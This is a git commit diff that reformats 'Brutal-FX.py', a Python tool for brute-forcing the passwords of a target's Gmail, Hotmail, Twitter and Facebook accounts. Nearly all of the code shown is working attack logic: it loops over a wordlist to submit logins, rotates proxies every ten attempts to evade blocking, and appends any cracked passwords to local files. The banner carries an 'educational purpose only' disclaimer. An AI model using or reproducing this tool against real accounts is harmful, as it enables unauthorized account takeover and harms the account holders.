2e8bfd0527825e755f6eda4a45bd67c887dfc494
Anirudh <68897241+redtrib3@users.noreply.github.com>
2022-08-01 12:48:36 +0000

    Minor Formatting changes

--- Brutal-FX.py
+++ Brutal-FX.py
@@ -1,6 +1,6 @@
 #!/usr/bin/python3
-#Importing modules
-#note: Modules :Proxylist,mechanize,cookielib are not inbuilt in python and needs to be installed through Pip3
+
+# note: Modules :Proxylist,mechanize,cookielib are not inbuilt in python and needs to be installed through Pip3
 
 import smtplib
 import threading
@@ -10,11 +10,11 @@ from optparse import *
 try:
     from proxylist import ProxyList
 except:
-    print("Please install module 'Proxylist'\nPip3 install proxy list ")
+    print("Please install module 'Proxylist'\nPip3 install proxylist ")
 try:
     from mechanize import Browser
 except:
-    print("Plese install module 'Mechanize'\nPip3install mechanize ")
+    print("Please install module 'Mechanize'\nPip3install mechanize ")
 
 import sys
 import logging
@@ -30,25 +30,26 @@ try:
 except:
     print("Plese install module 'Mechanize'\nPip3install mechanize ")
 
-#Colours for texts
-    
+# Colours for texts
 R = '\033[31m'       # red
 G = '\033[32m'       # green
-W = '\033[0m'        # white
-Y = '\036[47m'       # Yellow
+W = '\033[0m'        # reset color
+Y = '\u001b[33m'       # Yellow
+blink = '\u001b[05m'  # Blink text
+
 use = OptionParser("""{}
 
-     /$$$$$$$                        /$$               /$$                     /$$$$$$$$ /$$   /$$      
-    | $$__  $$                      | $$              | $$                    | $$_____/| $$  / $$      
-    | $$  \ $$  /$$$$$$  /$$   /$$ /$$$$$$    /$$$$$$ | $$                    | $$      |  $$/ $$/      
-    | $$$$$$$  /$$__  $$| $$  | $$|_  $$_/   |____  $$| $$       /$$$$$$      | $$$$$    \  $$$$/       
-    | $$__  $$| $$  \__/| $$  | $$  | $$      /$$$$$$$| $$      |______/      | $$__/     >$$  $$       
-    | $$  \ $$| $$      | $$  | $$  | $$ /$$ /$$__  $$| $$                    | $$       /$$/\  $$      
-    | $$$$$$$/| $$      |  $$$$$$/  |  $$$$/|  $$$$$$$| $$                    | $$      | $$  \ $$      
-    |_______/ |__/       \______/    \___/   \_______/|__/                    |__/      |__/  |__/      
-                                                                                                    
-            [ C O D E D  by:  Anirudh]          [DISCLAIMER: FOR EDUCATIONAL PURPOSE ONLY !]                                                                                                        
-                                                                  𝖎 𝖆𝖒 𝖓𝖔𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖒𝖎𝖘𝖚𝖘𝖊 𝖔𝖋 𝖙𝖍𝖎𝖘 𝖙𝖔𝖔𝖑                                    
+     /$$$$$$$                        /$$               /$$                     /$$$$$$$$ /$$   /$$
+    | $$__  $$                      | $$              | $$                    | $$_____/| $$  / $$
+    | $$  \ $$  /$$$$$$  /$$   /$$ /$$$$$$    /$$$$$$ | $$                    | $$      |  $$/ $$/
+    | $$$$$$$  /$$__  $$| $$  | $$|_  $$_/   |____  $$| $$       /$$$$$$      | $$$$$    \  $$$$/
+    | $$__  $$| $$  \__/| $$  | $$  | $$      /$$$$$$$| $$      |______/      | $$__/     >$$  $$
+    | $$  \ $$| $$      | $$  | $$  | $$ /$$ /$$__  $$| $$                    | $$       /$$/\  $$
+    | $$$$$$$/| $$      |  $$$$$$/  |  $$$$/|  $$$$$$$| $$                    | $$      | $$  \ $$
+    |_______/ |__/       \______/    \___/   \_______/|__/                    |__/      |__/  |__/
+
+            [ C O D E D  by:  Anirudh]          [DISCLAIMER: FOR EDUCATIONAL PURPOSE ONLY !]
+
 
 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 -g  (OR)  --gmail                             Eg. -g example@gmail.com -l wordlist.txt
@@ -59,15 +60,22 @@ xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 -p  (OR)  --password                          Try Single  Password
 -X  (OR)  --proxy                             show Proxy list
 
-							   """.format(G,W))
+							   """.format(G, W))
 
-use.add_option("-g", "--gmail", dest="gmail", help="provide Your Target Gmail username")
-use.add_option("-t", "--hotmail", dest="hotmail", help="provide Your Target Hotmail username")
-use.add_option("-T", "--twitter", dest="twitter", help="provide Your Target twitter username")
-use.add_option("-f", "--facebook", dest="facebook", help="provide Your Target Facebook username")
-use.add_option("-l", "--list", dest="list_password", help="Provide Your PASSWORDlist/wordlist")
-use.add_option("-p", "--password", dest="password", help="Try a single password Guess.")
+use.add_option("-g", "--gmail", dest="gmail",
+               help="provide Your Target Gmail username")
+use.add_option("-t", "--hotmail", dest="hotmail",
+               help="provide Your Target Hotmail username")
+use.add_option("-T", "--twitter", dest="twitter",
+               help="provide Your Target twitter username")
+use.add_option("-f", "--facebook", dest="facebook",
+               help="provide Your Target Facebook username")
+use.add_option("-l", "--list", dest="list_password",
+               help="Provide Your PASSWORD wordlist")
+use.add_option("-p", "--password", dest="password",
+               help="Try a single password Guess.")
 use.add_option("-X", "--proxy", dest="proxy", help="Proxy list ")
+
 (options, args) = use.parse_args()
 
 brows = Browser()
@@ -84,37 +92,41 @@ brows.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 proxyList = options.proxy
 
 
-
 def proxy():
     logging.basicConfig()
     pl = ProxyList()
     try:
         pl.load_file(proxyList)
     except:
-        sys.exit('[!] Proxy File format has incorrect | EXIT...')
+        sys.exit('[!] Proxy File format is incorrect\nBye...')
     pl.random()
     getProxy = pl.random().address()
     brows.set_proxies(proxies={"https": getProxy})
     try:
-        checkProxyIP = brows.open("https://api.ipify.org/?format=raw", timeout=10)
+        checkProxyIP = brows.open(
+            "https://api.ipify.org/?format=raw", timeout=10)
     except:
         return proxy()
 
 
-
-#FACEBOOK
+# FACEBOOK
 def facebook():
-    password_list = io.open(options.list_password, "r").readlines()     # reading lines in wordlist...
+    # reading lines in wordlist...
+    password_list = io.open(options.list_password, "r").readlines()
+#    print(password_list)
     try_login = 0
-    print("\rFacebook Account: {}".format(options.facebook))
-    print("%s<<<<<<+++++Attacking Now...+++++>>>>>%s" % (R, W))
+    print(f"{Y}\rFacebook Account: {options.facebook}{W}")
+    print("%s[+]        Attacking Now        %s" % (blink, W))
+
     for password in password_list:
         password = password.rstrip('\n')
         try_login += 1
         if try_login == 10:
             try_login = 0
             proxy()
-        print('\rPassword [==] {} '.format(password).rstrip("\n"))
+
+        print('\r[ trying ] Password : {} '.format(password).rstrip("\n"))
+
         sys.stdout.flush
         url = "https://ar-ar.facebook.com/login"
         try:
@@ -125,29 +137,35 @@ def facebook():
             brows.method = "POST"
             submit = brows.submit()
             if 'https://www.facebook.com/?sk=welcome' in submit.geturl():
-                print("{}[True][+] Password Found [{}][+]".format(G, password))
+                print("{}[+ Found] Password Found : {} ".format(G, password))
                 Save = io.open("Facebook.txt", "a").write(
                     "Account Facebook:" + options.facebook + "\t\tPassword:" + password + "\n")
                 break
             else:
                 print("%s[!] Incorrect Password %s\n" % (R, W))
         except:
-            print('[!] <<<There are speeches in Communication>>> \n')
+            print(f"{R}[!] Error Connecting to Facebook{W}")
+            # print('[!] <<<There are speeches in Communication>>> \n')
             proxy()
 
-#TWITTER
+# TWITTER
+
+
 def twitter():
     password_list = io.open(options.list_password, "r").readlines()
     try_login = 0
-    print("\rTwitter Account: {}".format(options.twitter))
-    print("%s<<<<<<+++++Attacking Now...+++++>>>>>%s" % (R, W))
+    print(f"{Y}\rTwitter Account: {options.twitter}{W}")
+    print("%s[+]         Attacking Now           %s" % (Y, W))
+
     for password in password_list:
         password = password.rstrip('\n')
         try_login += 1
         if try_login == 10:
             try_login = 0
             proxy()
-        print('\rPassword [==] {} '.format(password).rstrip("\n"))
+
+        print('\r [trying] Password : {} '.format(password).rstrip("\n"))
+
         sys.stdout.flush
         url = "https://mobile.twitter.com/login"
         try:
@@ -158,17 +176,19 @@ def twitter():
             brows.method = "POST"
             submit = brows.submit()
             if submit.geturl() == "https://mobile.twitter.com/":
-                print("{}[True][+] Password Found [{}][+]".format(G, password))
+                print("{}[+Found] Password Found : {}".format(G, password))
                 Save = io.open("Twitter.txt", "a").write(
                     "Account Twitter:" + options.twitter + "\t\tPassword:" + password + "\n")
                 break
+
             elif submit.geturl() == "https://mobile.twitter.com/home":
-                print("{}[True][+] Password Found [{}][+]".format(G, password))
+                print("{}[+Found] Password Found : {}".format(G, password))
                 Save = io.open("Twitter.txt", "a").write(
                     "Account Twitter:" + options.twitter + "\t\tPassword:" + password + "\n")
                 break
+
             elif 'https://mobile.twitter.com/account/login_challenge' in submit.geturl():
-                print("{}[True][+] Password Found [{}][+]".format(G, password))
+                print("{}[+Found] Password Found : {}".format(G, password))
                 Save = io.open("Twitter.txt", "a").write(
                     "Account Twitter:" + options.twitter + "\t\tPassword:" + password + "\n")
                 break
@@ -176,8 +196,9 @@ def twitter():
                 proxy()
             else:
                 print("%s[!] incorrect Password %s\n" % (R, W))
+
         except:
-            print('tester.py>>> \n')
+            print(f'{R}[!] Error Connecting to Twitter.{W}')
             proxy()
 
 
@@ -185,33 +206,38 @@ if options.gmail == None:
     if options.hotmail == None:
         if options.twitter == None:
             if options.facebook == None:
-                
-                    print(use.usage)
-                    exit()
+
+                print(use.usage)
+                exit()
+
     elif options.hotmail != None or options.gmail == None:
         smtp_srverH = smtplib.SMTP('smtp.live.com', 587)
         smtp_srverH.ehlo()
         smtp_srverH.starttls()
         if options.password != None or options.list_password == None:
-            print("%s<<<<<<+++++Attacking Now...+++++>>>>>%s" % (R, W))
+            print("%s[+]      Attacking Now      %s" % (B, W))
             try:
                 smtp_srverH.login(options.hotmail, options.password)
-                print("Password Found :{} \t Found Hotmail:{}".format(options.password, options.hotmail))
+                print("Password Found :{} \t Found Hotmail:{}".format(
+                    options.password, options.hotmail))
                 Save = io.open("Hotmail.txt", "a").write(
                     "Account Hotmail:" + options.hotmail + "\t\tPassword:" + options.password + "\n")
             except:
-                print("Not Found Password : {} \t Email Hotmail:{}".format(options.password, options.hotmail))
+                print("Password Not found : {} \t Email Hotmail:{}".format(
+                    options.password, options.hotmail))
         elif options.list_password != None or options.password == None:
             password_list = io.open(options.list_password, "r").readlines()
             for password in password_list:
                 try:
-                    print("%s<<<<<<+++++Start  Attacking Email+++++>>>>>%s" % (R, W))
+                    print("%s<<<<<<+++++Starting Attacking Email+++++>>>>>%s" % (R, W))
                     smtp_srverH.login(options.hotmail, password)
-                    print("FOUND Password :{} \n Found Hotmail:{}".format(password, options.hotmail))
+                    print("FOUND Password :{} \n Found Hotmail:{}".format(
+                        password, options.hotmail))
                     Save = io.open("Hotmail.txt", "a").write(
                         "Account Hotmail:" + options.hotmail + "\t\tPassword:" + password + "\n")
                 except smtplib.SMTPAuthenticationError:
-                    print("Not Found Password : {} \t Email Hotmail:{}".format(password, options.hotmail))
+                    print("Not Found Password : {} \t Email Hotmail:{}".format(
+                        password, options.hotmail))
     if options.twitter != None:
         hejab = threading.Thread(target=twitter, name="hejab")
         hejab.start()
@@ -231,11 +257,13 @@ elif options.gmail != None or options.hotmail == None or options.twitter == None
         print("%s<<<<<<+++++Attacking now...+++++>>>>>%s" % (R, W))
         try:
             smtp_srverG.login(options.gmail, options.password)
-            print("password Found :{} \t Found Gmail:{}".format(options.password, options.gmail))
+            print("password Found :{} \t Found Gmail:{}".format(
+                options.password, options.gmail))
             Save = io.open("Gmail.txt", "a").write(
                 "Account Gmail:" + options.gmail + "\t\tPassword:" + options.password + "\n")
         except:
-            print("Not Found Password : {} \t Email Gmail:{}".format(options.password, options.gmail))
+            print("Not Found Password : {} \t Email Gmail:{}".format(
+                options.password, options.gmail))
     elif options.list_password != None:
         password_list = io.open(options.list_password, "r").readlines()
         for password in password_list:
@@ -243,13 +271,17 @@ elif options.gmail != None or options.hotmail == None or options.twitter == None
             print("%s<<<<<<+++++Attacking Now...+++++>>>>>%s" % (R, W))
             try:
                 smtp_srverG.login(options.gmail, password)
-                print("{}<<<+++Found Password :{} \t Found Gmail:{}+++>>>".format(G, password, options.gmail))
+                print("{}<<<+++Found Password :{} \t Found Gmail:{}+++>>>".format(G,
+                      password, options.gmail))
                 Save = io.open("Gmail.txt", "a").write(
                     "Account Gmail:" + options.gmail + "\t\tPassword:" + password + "\n")
                 break
             except smtplib.SMTPAuthenticationError:
-                print("{}<<<---Password Not found : {} \t Email Gmail:{}--->>>".format(R, password, options.gmail))
+                print("{}<<<---Password Not found : {} \t Email Gmail:{}--->>>".format(R,
+                      password, options.gmail))
 
 else:
     print(use.usage)
     exit()
+
+# NOTE: Hey, I know that the code is badly written, i was a beginner back when i wrote it, please feel free to change the code yourself :) thanks
